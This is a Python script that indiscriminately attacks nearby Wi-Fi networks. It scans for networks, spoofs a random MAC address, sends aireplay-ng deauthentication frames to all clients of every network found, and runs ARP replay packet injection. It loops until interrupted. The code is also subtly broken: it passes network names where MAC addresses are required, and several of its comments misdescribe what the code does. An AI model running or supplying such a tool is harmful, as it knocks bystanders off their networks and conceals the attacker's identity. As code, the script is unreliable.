import subprocess
import time
import random
import os

def random_mac():
    return ":".join([hex(random.randint(0x00, 0xff))[2:].zfill(2) for _ in range(6)])

while True:
    try:
        output = subprocess.check_output(['iwlist', 'wlan0', 'scan'])
        networks = [line.split(':')[1] for line in output.split('\n') if 'ESSID' in line]
        for network in networks:
            subprocess.call(['iwconfig', 'wlan0', 'mode', 'monitor'])
            subprocess.call(['ifconfig', 'wlan0', 'down'])
            subprocess.call(['macchanger', '-m', random_mac(), 'wlan0'])
            subprocess.call(['ifconfig', 'wlan0', 'up'])
            subprocess.call(['aireplay-ng', '-0', '2', '-a', network.strip(), '-c', 'FF:FF:FF:FF:FF:FF', '-D', 'wlan0'])
            time.sleep(1)
            # check for incoming packets
            packets = subprocess.check_output(['tcpdump', '-i', 'wlan0', '-c', '1', 'src', network.strip()])
            if "bad checksum" in packets:
                # request a resend
                subprocess.call(['aireplay-ng', '-3', '-b', network.strip(), '-h', random_mac(), 'wlan0'])
                time.sleep(1)
            else:
                # drop incoming packets
                time.sleep(1)
        subprocess.call(['iwconfig', 'wlan0', 'mode', 'managed'])
        subprocess.call(['ifconfig', 'wlan0', 'down'])
        subprocess.call(['macchanger', '-p', 'wlan0'])
        subprocess.call(['ifconfig', 'wlan0', 'up'])
    except KeyboardInterrupt:
        break
